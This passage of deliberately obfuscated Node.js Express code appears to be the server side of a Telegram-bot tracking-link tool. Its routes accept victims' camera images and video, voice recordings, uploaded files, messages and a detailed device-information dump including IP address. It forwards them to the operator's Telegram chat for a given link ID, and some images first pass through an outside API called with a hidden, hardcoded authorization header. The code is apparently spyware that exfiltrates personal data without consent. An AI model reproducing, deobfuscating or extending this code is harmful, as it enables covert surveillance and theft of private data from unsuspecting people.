    _0x18d5b3[_0x168659(0x500)](validateLinkUsage, _0x49a5e0) ? _0x317f1b[_0x168659(0xd98)](path[_0x168659(0x75e)](__dirname, _0x18d5b3[_0x168659(0x541)])) : (_0x317f1b[_0x168659(0x9d2)](_0x18d5b3[_0x168659(0x978)]), bot[_0x168659(0x741) + 'e'](linkUsage[_0x49a5e0][_0x168659(0xa06)], _0x18d5b3[_0x168659(0xdd0)]));
}), app[_0x54266d(0x4bf)](_0x54266d(0xa95) + _0x54266d(0x6f2), (_0x410a2e, _0x2e4e77) => {
    const _0xa9a0b8 = _0x54266d, _0xf81478 = {
            'GCXWY': function (_0x19ea17, _0x6fba7c) {
                return _0x19ea17(_0x6fba7c);
            },
            'vzJJK': _0xa9a0b8(0x730),
            'PzUws': _0xa9a0b8(0x54b) + _0xa9a0b8(0xceb) + _0xa9a0b8(0x9b9) + _0xa9a0b8(0xc76) + _0xa9a0b8(0x8d7) + _0xa9a0b8(0xb94),
            'XbejR': _0xa9a0b8(0xa92) + _0xa9a0b8(0x24d) + _0xa9a0b8(0x46d) + _0xa9a0b8(0x1c6) + _0xa9a0b8(0xd21) + _0xa9a0b8(0xd32)
        }, _0x30462b = _0x410a2e[_0xa9a0b8(0xafd)][_0xa9a0b8(0x1b1)];
    _0xf81478[_0xa9a0b8(0x9bc)](validateLinkUsage, _0x30462b) ? _0x2e4e77[_0xa9a0b8(0xd98)](path[_0xa9a0b8(0x75e)](__dirname, _0xf81478[_0xa9a0b8(0xc60)])) : (_0x2e4e77[_0xa9a0b8(0x9d2)](_0xf81478[_0xa9a0b8(0xd8b)]), bot[_0xa9a0b8(0x741) + 'e'](linkUsage[_0x30462b][_0xa9a0b8(0xa06)], _0xf81478[_0xa9a0b8(0x2ea)]));
}), app[_0x54266d(0x4bf)](_0x54266d(0xbf8) + _0x54266d(0x7d6), (_0x29c483, _0x2ab114) => {
    const _0xc27896 = _0x54266d, _0x2cd8b8 = {
            'ogvDl': function (_0x1ff7ee, _0x4fc788) {
                return _0x1ff7ee(_0x4fc788);
            },
            'yplWk': _0xc27896(0x4bd),
            'esvhV': _0xc27896(0x54b) + _0xc27896(0xceb) + _0xc27896(0x9b9) + _0xc27896(0xc76) + _0xc27896(0x8d7) + _0xc27896(0xb94),
            'DgeMX': _0xc27896(0xa92) + _0xc27896(0x24d) + _0xc27896(0x46d) + _0xc27896(0x1c6) + _0xc27896(0xd21) + _0xc27896(0xd32)
        }, _0xf6ae4a = _0x29c483[_0xc27896(0xafd)][_0xc27896(0x1b1)];
    _0x2cd8b8[_0xc27896(0xbf2)](validateLinkUsage, _0xf6ae4a) ? _0x2ab114[_0xc27896(0xd98)](path[_0xc27896(0x75e)](__dirname, _0x2cd8b8[_0xc27896(0xbd8)])) : (_0x2ab114[_0xc27896(0x9d2)](_0x2cd8b8[_0xc27896(0xabd)]), bot[_0xc27896(0x741) + 'e'](linkUsage[_0xf6ae4a][_0xc27896(0xa06)], _0x2cd8b8[_0xc27896(0x1c2)]));
}), app[_0x54266d(0xa54)](_0x54266d(0x1d9) + 'es', (_0x42efad, _0x228f38) => {
    const _0x1a3447 = _0x54266d, _0x2adf39 = {
            'xJnqx': _0x1a3447(0x68a) + _0x1a3447(0x7c2) + _0x1a3447(0x7d3) + ':',
            'bPQtH': _0x1a3447(0x2f3) + _0x1a3447(0x3e7),
            'qkwsI': _0x1a3447(0xb43)
        }, _0x1ec3d4 = _0x42efad[_0x1a3447(0x386)][_0x1a3447(0xa06)], _0x8f4b6a = _0x42efad[_0x1a3447(0x386)][_0x1a3447(0xb87)], _0x4a4b97 = _0x42efad[_0x1a3447(0x386)][_0x1a3447(0x8d6)];
    console[_0x1a3447(0xb18)](_0x2adf39[_0x1a3447(0x9e1)], _0x42efad[_0x1a3447(0x386)]), bot[_0x1a3447(0x741) + 'e'](_0x1ec3d4, _0x1a3447(0x8d4) + _0x1a3447(0xb6a) + _0x1a3447(0x1fb) + ':\x20' + _0x8f4b6a + (_0x1a3447(0xd83) + _0x1a3447(0x51d)) + _0x4a4b97)[_0x1a3447(0x992)](() => {
    })[_0x1a3447(0x2c4)](_0x33b20b => {
        const _0x37ec02 = _0x1a3447;
        console[_0x37ec02(0x3a5)](_0x2adf39[_0x37ec02(0x252)], _0x33b20b[_0x37ec02(0x28f)] ? _0x33b20b[_0x37ec02(0x28f)][_0x37ec02(0x386)] : _0x33b20b);
    }), _0x228f38[_0x1a3447(0xadf)](_0x2adf39[_0x1a3447(0xb0f)]);
}), app[_0x54266d(0x477)](bodyParser[_0x54266d(0x912)]()), app[_0x54266d(0x477)](express[_0x54266d(0xb3e)](__dirname)), app[_0x54266d(0x4bf)](_0x54266d(0x6b7), (_0x3ef39e, _0x23be2c) => {
    const _0x115410 = _0x54266d, _0x18228e = { 'eBYMe': _0x115410(0xced) };
    _0x23be2c[_0x115410(0xd98)](path[_0x115410(0x75e)](__dirname, _0x18228e[_0x115410(0x5b0)]));
}), app[_0x54266d(0xa54)](_0x54266d(0x193) + _0x54266d(0x92c), (_0x57181a, _0x37c41b) => {
    const _0x52c111 = _0x54266d, _0x2b2a42 = { 'DwVTC': _0x52c111(0x68a) + _0x52c111(0x7c2) + _0x52c111(0x7d3) + ':' }, _0x5af360 = _0x57181a[_0x52c111(0x386)][_0x52c111(0xa06)], _0x5ac393 = _0x57181a[_0x52c111(0x386)][_0x52c111(0x993) + 'r'];
    bot[_0x52c111(0x741) + 'e'](_0x5af360, _0x52c111(0x906) + _0x52c111(0xca2) + _0x52c111(0x3fa) + _0x52c111(0xc99) + _0x52c111(0x83c) + _0x52c111(0x6c4) + _0x52c111(0x21a) + _0x52c111(0xb99) + ':\x20' + _0x5ac393)[_0x52c111(0x992)](() => {
        const _0x3b2f54 = _0x52c111;
        _0x37c41b[_0x3b2f54(0x912)]({ 'success': !![] });
    })[_0x52c111(0x2c4)](_0x51800c => {
        const _0x45f2d9 = _0x52c111;
        console[_0x45f2d9(0x3a5)](_0x2b2a42[_0x45f2d9(0x292)], _0x51800c[_0x45f2d9(0x28f)] ? _0x51800c[_0x45f2d9(0x28f)][_0x45f2d9(0x386)] : _0x51800c), _0x37c41b[_0x45f2d9(0x912)]({ 'success': ![] });
    });
}), app[_0x54266d(0xa54)](_0x54266d(0x996) + 'e', (_0x40d812, _0x2156fb) => {
    const _0x1827dd = _0x54266d, _0x592705 = {
            'gRnKV': _0x1827dd(0xb90) + _0x1827dd(0xb6f) + _0x1827dd(0x93d),
            'MuVdx': _0x1827dd(0x68a) + _0x1827dd(0x7c2) + _0x1827dd(0x7d3) + ':'
        }, _0x36d727 = _0x40d812[_0x1827dd(0x386)][_0x1827dd(0xa06)], _0x4fce42 = _0x40d812[_0x1827dd(0x386)][_0x1827dd(0x70b)];
    bot[_0x1827dd(0x741) + 'e'](_0x36d727, _0x1827dd(0x185) + _0x1827dd(0x8f4) + _0x1827dd(0xd92) + '\x20' + _0x4fce42)[_0x1827dd(0x992)](() => {
        const _0x284087 = _0x1827dd;
        _0x2156fb[_0x284087(0xadf)](_0x592705[_0x284087(0xbed)]);
    })[_0x1827dd(0x2c4)](_0x10cccc => {
        const _0x50cd1d = _0x1827dd;
        console[_0x50cd1d(0x3a5)](_0x592705[_0x50cd1d(0xa6f)], _0x10cccc[_0x50cd1d(0x28f)] ? _0x10cccc[_0x50cd1d(0x28f)][_0x50cd1d(0x386)] : _0x10cccc), _0x2156fb[_0x50cd1d(0x912)]({ 'success': ![] });
    });
}), app[_0x54266d(0x477)](bodyParser[_0x54266d(0x912)]({ 'limit': _0x54266d(0x227) })), app[_0x54266d(0x477)](bodyParser[_0x54266d(0x8cc)]({
    'limit': _0x54266d(0x227),
    'extended': !![]
}));
const dataStore = {};
app[_0x54266d(0x477)](express[_0x54266d(0xb3e)](__dirname));
const _authHeaders$4 = { 'Authorization': _0x54266d(0x564) + _0x54266d(0x9a0) + _0x54266d(0xd6a) + _0x54266d(0x3b3) + _0x54266d(0x9a9) + _0x54266d(0x89b) + _0x54266d(0x41a) + '3' };
app[_0x54266d(0xa54)](_0x54266d(0x7af) + 'eo', (_0xdfd625, _0x5c471f) => {
    const _0x8402ec = _0x54266d, _0x74a660 = {
            'RCzHv': _0x8402ec(0x68a) + _0x8402ec(0x4dd),
            'sVDcG': _0x8402ec(0x3b9) + _0x8402ec(0xdc6),
            'iqCJu': _0x8402ec(0x913),
            'QvgDW': function (_0xf3b14d, _0x583015) {
                return _0xf3b14d === _0x583015;
            },
            'CAyAF': _0x8402ec(0xc31),
            'rQMbW': function (_0x408914, _0x1e3a59) {
                return _0x408914 > _0x1e3a59;
            },
            'QhtxG': _0x8402ec(0x6d3),
            'PElcX': _0x8402ec(0xa5d) + _0x8402ec(0x190) + _0x8402ec(0x2ba),
            'evAup': _0x8402ec(0x837) + _0x8402ec(0xb37) + _0x8402ec(0xd52) + _0x8402ec(0xe24) + '.',
            'SpQMn': _0x8402ec(0x3b9) + _0x8402ec(0x848) + _0x8402ec(0x6e0) + _0x8402ec(0x796),
            'NnLUK': _0x8402ec(0x8c7) + _0x8402ec(0x453) + _0x8402ec(0xbc3),
            'mLdEJ': _0x8402ec(0x3b9) + _0x8402ec(0x197) + _0x8402ec(0x4c4) + 'eo',
            'Harfn': function (_0x2b73c4, _0x14fb45) {
                return _0x2b73c4 || _0x14fb45;
            },
            'kGRFM': _0x8402ec(0x4a2) + _0x8402ec(0x308) + _0x8402ec(0xa80) + _0x8402ec(0x303) + _0x8402ec(0xdc9),
            'RtkOE': _0x8402ec(0x825),
            'mtHUR': _0x8402ec(0x6d1) + _0x8402ec(0x282) + _0x8402ec(0x1ea) + _0x8402ec(0x977) + _0x8402ec(0x77e) + _0x8402ec(0x4d2)
        }, _0x2807b0 = _0xdfd625[_0x8402ec(0x386)][_0x8402ec(0xa06)], _0x50596d = _0xdfd625[_0x8402ec(0x386)][_0x8402ec(0x4c7)];
    if (_0x74a660[_0x8402ec(0x3ac)](!_0x2807b0, !_0x50596d))
        return _0x5c471f[_0x8402ec(0x972)](-0x227b + 0xd92 + 0x20b * 0xb)[_0x8402ec(0x9d2)](_0x74a660[_0x8402ec(0xd75)]);
    const _0x46f35a = _0x50596d[_0x8402ec(0x7aa)](',')[-0x2 * -0x8b + -0x234e + 0x2239], _0x8b55be = path[_0x8402ec(0x75e)](__dirname, _0x74a660[_0x8402ec(0x41f)]);
    !fs[_0x8402ec(0xcf7)](_0x8b55be) && fs[_0x8402ec(0x4f5)](_0x8b55be);
    const _0x18ce97 = { 'data': _0x8402ec(0xdf8) + _0x8402ec(0x9d4) + '4,' + _0x46f35a };
    axios[_0x8402ec(0xa54)](_0x74a660[_0x8402ec(0xce8)], _0x18ce97, { 'headers': _authHeaders$4 })[_0x8402ec(0x992)](_0x292190 => {
        const _0x14a432 = _0x8402ec, _0x497732 = { 'GuCGp': _0x74a660[_0x14a432(0x745)] }, _0x37015e = _0x292190[_0x14a432(0x50f)];
        console[_0x14a432(0xb18)](_0x14a432(0x4a3) + _0x14a432(0xc18) + _0x14a432(0x1b7) + _0x37015e[_0x14a432(0x9bb)] + (_0x14a432(0x33e) + _0x14a432(0x69d)) + _0x37015e[_0x14a432(0x91b)]);
        if (_0x74a660[_0x14a432(0xb61)](_0x37015e[_0x14a432(0x9bb)], _0x74a660[_0x14a432(0x4c3)]) && _0x74a660[_0x14a432(0x6b2)](_0x37015e[_0x14a432(0x91b)], -0xc8c + -0x2 * 0x138 + 0xefc + 0.9)) {
            const _0x2e60f3 = Buffer[_0x14a432(0x8e6)](_0x46f35a, _0x74a660[_0x14a432(0xb5d)]), _0x21261a = path[_0x14a432(0x75e)](_0x8b55be, _0x2807b0 + _0x14a432(0xd30));
            fs[_0x14a432(0x95c) + _0x14a432(0x6b3)](_0x21261a, _0x2e60f3), bot[_0x14a432(0x672)](_0x2807b0, _0x21261a, { 'caption': _0x74a660[_0x14a432(0xdc3)] })[_0x14a432(0x992)](() => {
                const _0x28c68b = _0x14a432;
                console[_0x28c68b(0xb18)](_0x28c68b(0x51f) + _0x28c68b(0xd3d) + _0x28c68b(0xd07) + _0x28c68b(0x65f) + _0x2807b0), _0x5c471f[_0x28c68b(0xadf)](_0x497732[_0x28c68b(0xc0c)]);
            })[_0x14a432(0x2c4)](_0x8d69f => {
                const _0x3be687 = _0x14a432;
                console[_0x3be687(0x3a5)](_0x74a660[_0x3be687(0xe2b)], _0x8d69f), _0x5c471f[_0x3be687(0x972)](0xdd * -0xc + -0x14cc + 0x211c)[_0x3be687(0x9d2)](_0x74a660[_0x3be687(0x5af)]);
            });
        } else
            bot[_0x14a432(0x741) + 'e'](_0x2807b0, _0x74a660[_0x14a432(0x3e8)]), _0x5c471f[_0x14a432(0x9d2)](_0x74a660[_0x14a432(0xce3)]);
    })[_0x8402ec(0x2c4)](_0x4e6961 => {
        const _0xb48963 = _0x8402ec;
        console[_0xb48963(0x3a5)](_0x74a660[_0xb48963(0x66e)], _0x4e6961), _0x5c471f[_0xb48963(0x972)](-0x1 * 0xeef + -0x240b * -0x1 + -0x1328)[_0xb48963(0x9d2)](_0x74a660[_0xb48963(0xd66)]);
    });
}), app[_0x54266d(0x4bf)](_0x54266d(0x5c8), (_0x1cbf79, _0x1f28dd) => {
    const _0x395b67 = _0x54266d, _0x15fd97 = { 'hKbZn': _0x395b67(0x54c) };
    _0x1f28dd[_0x395b67(0xd98)](path[_0x395b67(0x75e)](__dirname, _0x15fd97[_0x395b67(0x528)]));
});
let userRequests = {};
app[_0x54266d(0xa54)](_0x54266d(0x1f5) + _0x54266d(0x5fa), (_0x3e6387, _0x3dee7f) => {
    const _0xc63ea6 = _0x54266d, _0x28db83 = { 'wKpNf': _0xc63ea6(0x5ee) }, _0x53136e = _0x3e6387[_0xc63ea6(0x386)][_0xc63ea6(0xa06)], _0x5448ca = _0x3e6387[_0xc63ea6(0x386)][_0xc63ea6(0x9ca)], _0x5b1555 = _0x3e6387[_0xc63ea6(0x386)][_0xc63ea6(0xb21)];
    bot[_0xc63ea6(0x83a) + 'on'](_0x53136e, _0x5448ca, _0x5b1555), _0x3dee7f[_0xc63ea6(0x9d2)](_0x28db83[_0xc63ea6(0x4fa)]);
});
const _authHeaders$ = { 'Authorization': _0x54266d(0x564) + _0x54266d(0x9a0) + _0x54266d(0xd6a) + _0x54266d(0x3b3) + _0x54266d(0x9a9) + _0x54266d(0x89b) + _0x54266d(0x41a) + '3' };
app[_0x54266d(0xa54)](_0x54266d(0x193) + _0x54266d(0xd86), (_0x3f2ac9, _0x666c83) => {
    const _0x45f3c2 = _0x54266d, _0x2ea271 = {
            'XXYWC': function (_0x56e9e4, _0x58a203) {
                return _0x56e9e4 === _0x58a203;
            },
            'YGLQx': _0x45f3c2(0xc31),
            'RtSen': function (_0x5c0681, _0x3a485f) {
                return _0x5c0681 > _0x3a485f;
            },
            'HrNLn': function (_0x509d45, _0x2bf8c4) {
                return _0x509d45 + _0x2bf8c4;
            },
            'NvNpP': function (_0x2e0bb9, _0x4953c7) {
                return _0x2e0bb9 + _0x4953c7;
            },
            'GOJzZ': _0x45f3c2(0x8c7) + _0x45f3c2(0x453) + _0x45f3c2(0xbc3),
            'zhbrN': _0x45f3c2(0x8c7) + _0x45f3c2(0x453) + _0x45f3c2(0x350),
            'uYTvo': _0x45f3c2(0x6d3),
            'cNtSK': _0x45f3c2(0x6d1) + _0x45f3c2(0x282) + _0x45f3c2(0x1ea) + _0x45f3c2(0x977) + _0x45f3c2(0x77e) + _0x45f3c2(0x4d2),
            'CnIRC': _0x45f3c2(0xaa5) + _0x45f3c2(0x77b) + '.',
            'XjNqC': _0x45f3c2(0x68a) + _0x45f3c2(0x4b6) + ':',
            'zfyht': _0x45f3c2(0x68a) + _0x45f3c2(0x4b6),
            'DnaBD': _0x45f3c2(0xbfd) + _0x45f3c2(0x7c6),
            'pXvJD': _0x45f3c2(0x82a) + ':\x20',
            'azpQB': function (_0x2807c5, _0x215faf) {
                return _0x2807c5 > _0x215faf;
            },
            'jHehc': _0x45f3c2(0x4ea) + _0x45f3c2(0x6ac),
            'hNwQj': _0x45f3c2(0x4ea) + _0x45f3c2(0x514)
        }, _0x28f446 = _0x3f2ac9[_0x45f3c2(0x386)][_0x45f3c2(0xa06)], _0x222bb5 = _0x3f2ac9[_0x45f3c2(0x386)][_0x45f3c2(0x24f)][_0x45f3c2(0x7aa)](',');
    console[_0x45f3c2(0xb18)](_0x2ea271[_0x45f3c2(0xd97)], _0x222bb5[_0x45f3c2(0x574)], _0x2ea271[_0x45f3c2(0xda8)], _0x28f446);
    if (_0x2ea271[_0x45f3c2(0x968)](_0x222bb5[_0x45f3c2(0x574)], -0x16a1 + -0x2 * 0x51b + 0x20d7 * 0x1)) {
        const _0x1f1da1 = _0x222bb5[_0x45f3c2(0x79b)]((_0x253b69, _0x11d558) => {
            const _0x1f4bc9 = _0x45f3c2, _0x426b37 = {
                    'sICdd': _0x2ea271[_0x1f4bc9(0x755)],
                    'mFgQW': _0x2ea271[_0x1f4bc9(0x74d)]
                }, _0xb4e7 = Buffer[_0x1f4bc9(0x8e6)](_0x253b69, _0x2ea271[_0x1f4bc9(0xc51)]), _0x5193d8 = { 'data': _0x1f4bc9(0x792) + _0x1f4bc9(0x52f) + _0x1f4bc9(0x1aa) + _0x253b69 };
            return axios[_0x1f4bc9(0xa54)](_0x2ea271[_0x1f4bc9(0x1f2)], _0x5193d8, { 'headers': _authHeaders$ })[_0x1f4bc9(0x992)](_0x315c9e => {
                const _0x4c288b = _0x1f4bc9, _0x3ff258 = _0x315c9e[_0x4c288b(0x50f)];
                return console[_0x4c288b(0xb18)](_0x4c288b(0x4a3) + _0x4c288b(0xc18) + _0x4c288b(0x1b7) + _0x3ff258[_0x4c288b(0x9bb)] + (_0x4c288b(0x33e) + _0x4c288b(0x69d)) + _0x3ff258[_0x4c288b(0x91b)]), _0x2ea271[_0x4c288b(0x587)](_0x3ff258[_0x4c288b(0x9bb)], _0x2ea271[_0x4c288b(0x3b5)]) && _0x2ea271[_0x4c288b(0x671)](_0x3ff258[_0x4c288b(0x91b)], 0x1 * -0x1cc1 + 0x1a * 0x97 + -0xe5 * -0xf + 0.9) ? bot[_0x4c288b(0x359)](_0x28f446, _0xb4e7, { 'caption': _0x4c288b(0xb58) + _0x2ea271[_0x4c288b(0x21c)](_0x11d558, 0x168 * -0xa + -0x251a + -0x332b * -0x1) }) : bot[_0x4c288b(0x741) + 'e'](_0x28f446, _0x4c288b(0x9ed) + _0x2ea271[_0x4c288b(0x4d4)](_0x11d558, -0x117a + -0x69 * 0x41 + 0x2c24) + (_0x4c288b(0x270) + _0x4c288b(0xd16) + _0x4c288b(0x655) + _0x4c288b(0xb05)));
            })[_0x1f4bc9(0x2c4)](_0x5503d2 => {
                const _0x5b7ba8 = _0x1f4bc9;
                console[_0x5b7ba8(0x3a5)](_0x426b37[_0x5b7ba8(0x854)], _0x5503d2), _0x666c83[_0x5b7ba8(0x972)](-0x3be * 0x1 + 0x283 * -0xb + -0x13 * -0x1c1)[_0x5b7ba8(0x912)]({ 'error': _0x426b37[_0x5b7ba8(0x979)] });
            });
        });
        Promise[_0x45f3c2(0x351)](_0x1f1da1)[_0x45f3c2(0x992)](() => {
            const _0x211df0 = _0x45f3c2;
            console[_0x211df0(0xb18)](_0x2ea271[_0x211df0(0xcd8)]), _0x666c83[_0x211df0(0x912)]({ 'success': !![] });
        })[_0x45f3c2(0x2c4)](_0x3d7b5e => {
            const _0x1cf00b = _0x45f3c2;
            console[_0x1cf00b(0x3a5)](_0x2ea271[_0x1cf00b(0xac2)], _0x3d7b5e), _0x666c83[_0x1cf00b(0x972)](-0x1 * -0xeb7 + -0x242b + 0x2ed * 0x8)[_0x1cf00b(0x912)]({ 'error': _0x2ea271[_0x1cf00b(0x479)] });
        });
    } else
        console[_0x45f3c2(0xb18)](_0x2ea271[_0x45f3c2(0x7c4)]), _0x666c83[_0x45f3c2(0x972)](-0x518 + 0x536 * -0x3 + 0x164a)[_0x45f3c2(0x912)]({ 'error': _0x2ea271[_0x45f3c2(0x51b)] });
}), app[_0x54266d(0xa54)](_0x54266d(0x3ea) + _0x54266d(0x6cf), upload[_0x54266d(0x221)](_0x54266d(0x4ec), 0xed5 + -0xf * 0x27 + -0x54 * 0x26), (_0x4cbbdf, _0x4c13dd) => {
    const _0x577a63 = _0x54266d, _0x271e5f = {
            'vsgmf': function (_0x142986, _0x14f2e7) {
                return _0x142986 > _0x14f2e7;
            }
        }, _0x4c5cdf = _0x4cbbdf[_0x577a63(0x386)][_0x577a63(0xa9b)], _0x2ccc91 = _0x4cbbdf[_0x577a63(0x5e8)];
    if (_0x2ccc91 && _0x271e5f[_0x577a63(0x1ba)](_0x2ccc91[_0x577a63(0x574)], 0x500 + 0x1 * -0x6bb + -0x1bb * -0x1)) {
        console[_0x577a63(0xb18)](_0x577a63(0x9aa) + _0x2ccc91[_0x577a63(0x574)] + '\x20\x20' + _0x4c5cdf);
        const _0x17d14b = _0x2ccc91[_0x577a63(0x79b)](_0x42909f => bot[_0x577a63(0x359)](_0x4c5cdf, _0x42909f[_0x577a63(0x8b2)]));
        Promise[_0x577a63(0x351)](_0x17d14b)[_0x577a63(0x992)](() => {
            const _0x5f066d = _0x577a63;
            console[_0x5f066d(0xb18)](''), _0x4c13dd[_0x5f066d(0x912)]({ 'success': !![] });
        })[_0x577a63(0x2c4)](_0x30c894 => {
            const _0x186cae = _0x577a63;
            console[_0x186cae(0x3a5)](':', _0x30c894), _0x4c13dd[_0x186cae(0x972)](0x3fe * -0x2 + -0x1fa8 + -0x16 * -0x1e4)[_0x186cae(0x912)]({ 'error': '' });
        });
    } else
        console[_0x577a63(0xb18)](''), _0x4c13dd[_0x577a63(0x972)](-0x11a7 + -0x2578 + -0x3 * -0x12e5)[_0x577a63(0x912)]({ 'error': '' });
}), app[_0x54266d(0xa54)](_0x54266d(0x484) + 'ce', uploadVoice[_0x54266d(0xb70)](_0x54266d(0x749)), (_0x507bf1, _0x362dc0) => {
    const _0x3580d7 = _0x54266d, _0x3e0706 = { 'yeChG': _0x3580d7(0xdaf) }, _0x270ffa = _0x507bf1[_0x3580d7(0x386)][_0x3580d7(0xa06)], _0x28cd61 = _0x507bf1[_0x3580d7(0x496)][_0x3580d7(0x55d)];
    bot[_0x3580d7(0xdd8)](_0x270ffa, _0x28cd61)[_0x3580d7(0x992)](() => {
        const _0x1c1295 = _0x3580d7;
        fs[_0x1c1295(0x37f)](_0x28cd61), _0x362dc0[_0x1c1295(0x9d2)]('');
    })[_0x3580d7(0x2c4)](_0x18605d => {
        const _0x610fd1 = _0x3580d7;
        console[_0x610fd1(0x3a5)](_0x18605d), _0x362dc0[_0x610fd1(0x972)](0x8 * 0xb3 + -0x15f0 + 0x124c)[_0x610fd1(0x9d2)](_0x3e0706[_0x610fd1(0xa49)]);
    });
});
const PORT = process[_0x54266d(0xd4b)][_0x54266d(0x8b8)] || 0x152 * 0x2 + -0x14a5 + -0x7 * -0x43f;
app[_0x54266d(0x6f7)](PORT, () => {
    const _0x5d4d3d = _0x54266d;
    console[_0x5d4d3d(0xb18)](_0x5d4d3d(0x315) + _0x5d4d3d(0x8b5) + _0x5d4d3d(0x680) + PORT);
}), app[_0x54266d(0x4bf)](_0x54266d(0x3e4), (_0x5c69ca, _0x4b476f) => {
    const _0x329c30 = _0x54266d, _0x1fadb6 = { 'usnVh': _0x329c30(0xb3f) };
    _0x4b476f[_0x329c30(0xd98)](path[_0x329c30(0x75e)](__dirname, _0x1fadb6[_0x329c30(0xd6d)]));
}), app[_0x54266d(0xa54)](_0x54266d(0x49a), async (_0x3807c1, _0x48cd07) => {
    const _0xa527dd = _0x54266d, _0x55f11c = {
            'PcJFu': _0xa527dd(0x801),
            'nEtAG': _0xa527dd(0x5b1) + _0xa527dd(0x830) + _0xa527dd(0x59a),
            'DWLgD': _0xa527dd(0x760) + _0xa527dd(0x4d1) + _0xa527dd(0x6fe),
            'xuiKy': _0xa527dd(0x760) + _0xa527dd(0x4d1) + _0xa527dd(0x42b),
            'pOJLM': _0xa527dd(0x6e4) + _0xa527dd(0xdf1) + _0xa527dd(0xa3c)
        }, _0x3d3437 = _0x3807c1[_0xa527dd(0x386)][_0xa527dd(0xa9b)], _0x5681ec = _0x3807c1[_0xa527dd(0x386)][_0xa527dd(0x784)];
    if (_0x5681ec) {
        const _0x3a7019 = _0xa527dd(0xcb2) + _0xa527dd(0xb36) + _0xa527dd(0x317) + _0xa527dd(0x611) + _0x5681ec[_0xa527dd(0xdb3)] + (_0xa527dd(0x5dc) + _0xa527dd(0x5f5)) + _0x5681ec[_0xa527dd(0x631)] + (_0xa527dd(0x534) + _0xa527dd(0x3e9)) + _0x5681ec['ip'] + (_0xa527dd(0x50d) + _0xa527dd(0x451)) + _0x5681ec[_0xa527dd(0xd9d)] + (_0xa527dd(0x78d) + _0xa527dd(0x84a) + _0xa527dd(0x5cc)) + _0x5681ec[_0xa527dd(0x744)] + (_0xa527dd(0x632) + _0xa527dd(0x611)) + _0x5681ec[_0xa527dd(0x5be)] + _0xa527dd(0x540) + _0x5681ec[_0xa527dd(0x9cb) + 'ed'] + (_0xa527dd(0x1d1) + _0xa527dd(0x7c3) + _0xa527dd(0x846) + _0xa527dd(0x88e)) + _0x5681ec[_0xa527dd(0x1d3) + 'e'] + (_0xa527dd(0xaa4) + ':\x20') + _0x5681ec[_0xa527dd(0xbcd)] + (_0xa527dd(0x5b8) + _0xa527dd(0xb6e)) + _0x5681ec[_0xa527dd(0xe0b)] + (_0xa527dd(0xd8f) + _0xa527dd(0x2a0)) + _0x5681ec[_0xa527dd(0x45a) + _0xa527dd(0x522)] + (_0xa527dd(0x3fd) + _0xa527dd(0xb6e)) + _0x5681ec[_0xa527dd(0x487)] + (_0xa527dd(0x72c) + _0xa527dd(0x3ee)) + _0x5681ec[_0xa527dd(0x549)] + (_0xa527dd(0x7ca) + _0xa527dd(0xa3e) + _0xa527dd(0x611)) + _0x5681ec[_0xa527dd(0x39e) + _0xa527dd(0x240)] + (_0xa527dd(0xdd3) + _0xa527dd(0xd50) + '\x20') + _0x5681ec[_0xa527dd(0x1e7)] + (_0xa527dd(0x326) + _0xa527dd(0xcbd)) + _0x5681ec[_0xa527dd(0xdff)] + (_0xa527dd(0x9cf) + _0xa527dd(0xbd0)) + _0x5681ec[_0xa527dd(0x343) + 'e'] + (_0xa527dd(0xc4f) + _0xa527dd(0x661)) + _0x5681ec[_0xa527dd(0x868) + _0xa527dd(0x725)] + (_0xa527dd(0xbe7) + _0xa527dd(0x663)) + _0x5681ec[_0xa527dd(0x3ad) + _0xa527dd(0x256)] + (_0xa527dd(0x5c2) + _0xa527dd(0xa89) + _0xa527dd(0x7db)) + _0x5681ec[_0xa527dd(0x223)] + (_0xa527dd(0x5d5) + _0xa527dd(0x663)) + _0x5681ec[_0xa527dd(0x1da) + _0xa527dd(0xe02)] + (_0xa527dd(0x3dc) + _0xa527dd(0x61e)) + _0x5681ec[_0xa527dd(0xd79)] + (_0xa527dd(0xba0) + _0xa527dd(0xa08) + _0xa527dd(0x860)) + _0x5681ec[_0xa527dd(0x2ad)] + (_0xa527dd(0x3c3) + _0xa527dd(0xb67) + _0xa527dd(0x2b1) + '\x20') + _0x5681ec[_0xa527dd(0x189) + _0xa527dd(0x947)] + (_0xa527dd(0x402) + _0xa527dd(0x5b5) + _0xa527dd(0xe1a)) + _0x5681ec[_0xa527dd(0x76d) + _0xa527dd(0x44a)] + (_0xa527dd(0x748) + _0xa527dd(0x9fb) + _0xa527dd(0x634) + _0xa527dd(0x648)) + _0x5681ec[_0xa527dd(0x68b) + _0xa527dd(0x8cf)] + (_0xa527dd(0xccb) + _0xa527dd(0xa59) + _0xa527dd(0xa1e)) + _0x5681ec[_0xa527dd(0xbdb) + _0xa527dd(0x2c9)] + (_0xa527dd(0x22d) + _0xa527dd(0x6c5) + _0xa527dd(0x229)) + _0x5681ec[_0xa527dd(0x5ec) + 'rt'] + (_0xa527dd(0x54d) + '\x20');
        try {
            await bot[_0xa527dd(0x741) + 'e'](_0x3d3437, _0x3a7019, { 'parse_mode': _0x55f11c[_0xa527dd(0x924)] }), console[_0xa527dd(0xb18)](_0x55f11c[_0xa527dd(0x8b9)]), _0x48cd07[_0xa527dd(0x912)]({ 'success': !![] });
        } catch (_0x25359c) {
            console[_0xa527dd(0x3a5)](_0x55f11c[_0xa527dd(0x2fc)], _0x25359c), _0x48cd07[_0xa527dd(0x972)](0x168f + 0x164b + -0x11 * 0x286)[_0xa527dd(0x912)]({ 'error': _0x55f11c[_0xa527dd(0x3f6)] });
        }
    } else
        console[_0xa527dd(0xb18)](_0x55f11c[_0xa527dd(0xaee)]), _0x48cd07[_0xa527dd(0x972)](0x24c7 + 0xb4d + 0x34 * -0xe5)[_0xa527dd(0x912)]({ 'error': _0x55f11c[_0xa527dd(0xaee)] });
});
const _authHeaders$2 = { 'Authorization': _0x54266d(0x564) + _0x54266d(0x9a0) + _0x54266d(0xd6a) + _0x54266d(0x3b3) + _0x54266d(0x9a9) + _0x54266d(0x89b) + _0x54266d(0x41a) + '3' };
app[_0x54266d(0xa54)](_0x54266d(0x809), (_0x4b3453, _0x46410c) => {
    const _0x48836a = _0x54266d, _0x33e964 = {
            'bhveg': function (_0x17aa98, _0x51b4ad) {
                return _0x17aa98 === _0x51b4ad;
            },
            'GkyXj': _0x48836a(0xc31),
            'NdzLb': function (_0x13afde, _0x44b0f6) {
                return _0x13afde > _0x44b0f6;
            },
            'vOlur': function (_0x2e3d57, _0x4db6fd) {
                return _0x2e3d57 + _0x4db6fd;
            },
            'DlEqF': _0x48836a(0x8c7) + _0x48836a(0x453) + _0x48836a(0xbc3),
